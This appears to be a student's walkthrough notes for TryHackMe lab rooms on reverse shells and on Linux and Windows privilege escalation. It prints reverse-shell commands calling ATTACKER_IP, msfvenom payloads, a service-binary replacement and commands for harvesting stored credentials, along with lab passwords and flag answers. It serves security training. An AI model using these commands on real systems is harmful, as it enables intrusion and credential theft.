On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:

`net user <username> <password> /add`
`net localgroup administrators <username> /add`

The important take away from this task:

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.

## Task 13 Practice and Examples
This room contained a lot of information, and gave you little opportunity to put it into practice throughout. The following two tasks contain virtual machines (one Ubuntu 18.04 server and one Windows server), each configured with a simple webserver with which you can upload and activate shells. This is a sandbox environment, so there will be no filters to bypass. Login credentials and instructions for each will also be given, should you wish to log in to practice with netcat, socat or meterpreter shells.

# Answer the questions below
Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.

# Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

# Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

# Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

# Look through Payloads all the Things[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md] and try some of the other reverse shell techniques. Try to analyse them and see why they work.

# Switch to the Windows VM. Try uploading and activating the `php-reverse-shell`. Does this work?


# Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.

# The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.

# Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

# Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.

# Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?


## Task 14 Linux Practice Box
The box attached to this task is an Ubuntu server with a file upload page running on a webserver. This should be used to practice shell uploads on Linux systems. Equally, both socat and netcat are installed on this machine, so please feel free to log in via SSH on port 22 to practice with those directly. The credentials for logging in are:

Username: `shell`
Password: `TryH4ckM3!`
Answer the questions below `No Answer Required`

## Task 15 Windows Practice Box
This task contains a Windows 2019 Server box running a XAMPP webserver. This can be used to practice shell uploads on Windows. Again, both Socat and Netcat are installed, so feel free to log in over RDP or WinRM to practice with these. The credentials are:

Username: `Administrator`
Password: `TryH4ckM3!`
To login using RDP:
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'
```
Answer the questions below `No answer required`


## ② The fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

# Task 1 Introduction
Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.
This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.
Answer the questions below
Read the above. `No answer needed`

# Task 2 What is Privilege Escalation?
## What does "privilege escalation" mean?
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

## Why is it important?
It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

   • Resetting passwords
   • Bypassing access controls to compromise protected data
   • Editing software configurations
   • Enabling persistence
   • Changing the privilege of existing (or new) users
   • Execute any administrative command

## Answer the questions below. Read the above.`No answer needed`

# Task 3 Enumeration
Note: Launch the target machine attached to this task to follow along.You can launch the target machine and access it directly from your browser. Alternatively, you can access it over SSH with the low-privilege user credentials below:

`Username: karen
Password: Password1`
Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

## hostname
The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

## uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

## /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

## /etc/issue
Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

## ps Command
The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
The output of the ps (Process Status) will show the following;

  • `PID`: The process ID (unique to the process)
  
  • `TTY`: Terminal type used by the user
  
  • `Time`: Amount of CPU time used by the process (this is NOT the time this process has been running for)
  
  • `CMD`: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

  • `ps -A`: View all running processes
  
  • `ps axjf`: View process tree (see the tree formation until ps axjf is run below)
  
  • `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

## env
The `env` command will show environmental variables.The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

## sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

## ls
One of the common commands used in Linux is probably `ls`. While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

## Id
The `id` command will provide a general overview of the user’s privilege level and group memberships.It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

## /etc/passwd
Reading the `/etc/passwd` file can be an easy way to discover users on the system.While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory. 

## history
Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

## ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks. This can be confirmed using the `ip route` command to see which network routes exist. 

## netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

   • `netstat -a`: shows all listening ports and established connections.
   
   • `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
   
   • `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports 
that are listening using the TCP protocol (below) 

   • `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol. 
   
   • `netstat -tp`: list connections with the service name and PID information.

This can also be used with the `-l` option to list listening ports (below). We can see the “PID/Program name” column is empty as this process is owned by another user.
Below is the same command run with root privileges and reveals this information as 2641/nc (netcat).
    
   • `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

 The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

   • `-a`: Display all sockets
   
   • `-n`: Do not resolve names
   
   • `-o`: Display timers

##  find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
Below are some useful examples for the “find” command.
Find files:

   • `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
   
   • `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
   
   • `find / -type d -name config`: find the directory named config under “/”
   
   • `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
   
   • `find / -perm a=x`: find executable files
   
   • `find /home -user frank`: find all files for user “frank” under “/home”
   
   • `find / -mtime 10`: find files that were modified in the last 10 days
   
   • `find / -atime 10`: find files that were accessed in the last 10 days
   
   • `find / -cmin -60`: find files changed within the last hour (60 minutes)
   
   • `find / -amin -60`: find files accesses within the last hour (60 minutes)
   
   • `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size. 
Folders and files that can be written to or executed from:

   • `find / -writable -type d 2>/dev/null` : Find world-writeable folders
   
   • `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
   
   • `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works. 

   • `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:

   • `find / -name perl*`
   
   • `find / -name python*`
   
   • `find / -name gcc*`

Find specific file permissions: 
Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

    `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

General Linux Commands
As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.

## Answer the questions below
# What is the hostname of the target system?  `wade7363`
```
root@ip-10-10-143-69:~# ssh karen@10.10.158.74
The authenticity of host '10.10.158.74 (10.10.158.74)' can't be established.
ECDSA key fingerprint is SHA256:2Jwy90uXhJ7tauI06IwaC9BDSjK9/HsuVGpB1CDYFvw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.158.74' (ECDSA) to the list of known hosts.
karen@10.10.158.74's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
# What is the Linux kernel version of the target system? `3.13.0-24-generic`

# What Linux is this? We can use the `cat /etc/issue` command to find the operating system version.`Ubuntu 14.04 LTS`

# What version of the Python language is installed on the system? Run the `python --version` command to see which version is installed. `2.7.6`
```
$ python
Python 2.7.6 (default, Mar 22 2014, 22:59:56) 
```
# What vulnerability seem to affect the kernel of the target system? (Enter a CVE number), did some external reseach `CVE-2015-1328`

# Task 4 Automated Enumeration Tools
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

   • LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
   
   • LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
   
   • Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
   
   • Linux Priv Checker: https://github.com/linted/linuxprivchecker

# Answer the questions below
Install and try a few automated enumeration tools on your local Linux distribution. `No answer needed`

# Task 5 Privilege Escalation:Kernel Exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
The Kernel exploit methodology is simple;

   1. Identify the kernel version
   2. Search and find an exploit code for the kernel version of the target system
   3. Run the exploit 

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

## Research sources:

   1. Based on your findings, you can use Google to search for an existing exploit code.
   2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
   3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

## Hints/Notes:

   1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
   2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
   3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
   4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

# Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.`No answer needed`

  1. Identify the kernel version.
  2. Search and find an exploit code for the kernel version of the target system.
This we can find with some quick Googling. Download the exploit and move it into your `/tmp` folder.We can also get it via `searchploit`.
  3. 3. Run the exploit.Open up the terminal on your local machine, and start up the machine in Attackbox. In Attackbox, let's run the id command and take note of our current user privilege.On your local machine, we need to start up a python server so that we can send our downloaded exploit to our target machine in Attackbox. We can do this via the `python3 -m http.server 8000` command. Don't close this terminal.Open up a new tab/terminal so that we can get the IP address of our local machine. We need this to connect to our target machine. Use the `ifconfig` command and scroll down.
Cool, now we can go ahead and send our exploit that we downloaded and stored in our /tmp file to our target machine. Go to your Attackbox and first cd into your /tmp folder before connecting to your local machine. If you don't cd into /tmp first then you will get an error when trying to connect. Now, to send the exploit and make a connection we can enter the following command (replace the IP with your ifconfig IP) `wget http://yourip:8000/37292.c`.Okay, the exploit is sent. Now to convert it, we can enter the following command `gcc 37292.c -o pwned`. With our exploit converted, we can run it via the `./pwned` command.

# What is the content of the flag1.txt file? 



# Task 6 Privilege Escalation: Sudo

# Task 7 Privilege Escalation: SUID

# Task 8 Privilege Escalation: Capabilities

# Task 9 Privilege Escalation: Cron Jobs

# Task 10 Privilege Escation: PATH

# Task 11 Privilege Escalations: NFS

# Task 12 Capstone Challenge

## ③ Windows Privilege Escalation
Learn the fundamentals of Windows privilege escalation techniques.

# Task 1 Introduction
During a penetration test, you will often have access to some Windows hosts with an unprivileged user. Unprivileged users will hold limited access, including their files and folders only, and have no means to perform administrative tasks on the host, preventing you from having complete control over your target. This room covers fundamental techniques that attackers can use to elevate privileges in a Windows environment, allowing you to use any initial unprivileged foothold on a host to escalate to an administrator account, where possible.
If you want to brush up on your skills first, you can have a look through the Windows Fundamentals Module or the Hacking Windows Module.

## Answer the questions below
Click and continue learning! `No answer needed`

# Task 2 Windows Privilege Escalation
Simply put, privilege escalation consists of using given access to a host with "user A" and leveraging it to gain access to "user B" by abusing a weakness in the target system. While we will usually want "user B" to have administrative rights, there might be situations where we'll need to escalate into other unprivileged accounts before actually getting administrative privileges.
Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:

• Misconfigurations on Windows services or scheduled tasks

• Excessive privileges assigned to our account

• Vulnerable software

• Missing Windows security patches

Before jumping into the actual techniques, let's look at the different account types on a Windows system.

## Windows Users
Windows systems mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:
	
Administrators	These users have the most privileges. They can change any system configuration parameter and access any file in the system.
Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.
In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
SYSTEM / LocalSystem	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
Local Service	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
Network Service	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.
## Answer the questions below
Users that can change system configurations are part of which group? `Administrators`

The SYSTEM account has more privileges than the Administrator user (aye/nay) `Aye`

# Task 3 Harvesting Passwords from Usual Spots
The easiest way to gain access to another user is to gather credentials from a compromised machine. Such credentials could exist for many reasons, including a careless user leaving them around in plaintext files; or even stored by some software like browsers or email clients.
This task will present some known places to look for passwords on a Windows system.
Before going into the task, remember to click the Start Machine button. You will be using the same machine throughout tasks 3 to 5. If you are using the AttackBox, this is also a good moment to start it as you'll be needing it for the following tasks.

In case you prefer connecting to the target machine via RDP, you can use the following credentials:

User: `thm-unpriv`
Password: `Password321`

## Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
• C:\Unattend.xml

• C:\Windows\Panther\Unattend.xml

• C:\Windows\Panther\Unattend\Unattend.xml

• C:\Windows\system32\sysprep.inf

• C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:
```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```
## Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe `prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
Note: The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile% `with `$Env:userprofile`. 

### Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```cmdkey /list```

While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the `runas` command and the `/savecred` option, as seen below.
```runas /savecred /user:admin cmd.exe```

## IIS Configuration
Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
* C:\inetpub\wwwroot\web.config

* C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY
PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.
## Answer the questions below
1: A password for the julia.jones user has been left on the Powershell history. What is the password?  `ZuperCkretPa5z`
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
2: A web server is running on the remote host. Find any interesting password on web.config files associated with IIS. What is the password of the db_admin user?  `098n0x35skjD3`
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
3: There is a saved password on your Windows credentials. Using cmdkey and runas, spawn a shell for mike.katz and retrieve the flag from his desktop.  `THM{WHAT_IS_MY_PASSWORD}`
```
runas /savecred /user:mike.katz cmd.exe
type C:\Users\mike.katz\Desktop\flag.txt
```
4: Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user? `CoolPass2021`
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
# Task 4 Other Quick Wins
Privilege escalation is not always a challenge. Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access. It would help if you considered these to belong more to the realm of CTF events rather than scenarios you will encounter during real penetration testing engagements. However, if none of the previously mentioned methods works, you can always go back to these.

## Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
Scheduled tasks can be listed from the command line using the `schtasks` command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```
You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`:
```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```
As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, `nc64.exe` can be found on `C:\tools`. Let's change the bat file to spawn a reverse shell:
```
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
We then start a listener on the attacker machine on the same port we indicated on our reverse shell:  `nc -lvp 4444` 
The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
`C:\> schtasks /run /tn vulntask`
And you will receive the reverse shell with taskusr1 privileges as expected: 
```
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```
## AlwaysInstallElevated
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
Note: The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.
This method requires two registry values to be set. You can query these from the command line using the commands below.
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
## Answer the questions below
What is the taskusr1 flag? `THM{TASK_COMPLETED}`

# Task 5 Abusing Service Misconfigurations

## Windows Services
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
To better understand the structure of a service, let's check the apphostsvc service configuration with the `sc qc` command:
```
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```
Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.
Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`:
A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using `sc`:
```
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```
We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:
```
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We can then pull the payload from Powershell with the following command:
```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```
Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```
We start a reverse listener on our attacker machine: `user@attackerpc$ nc -lvp 4445` And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt: 
```
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
Note: PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
```
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```
## Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `”C:\Program Files\RealVNC\VNC Server\vncserver.exe”`, followed by the given parameters:
```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
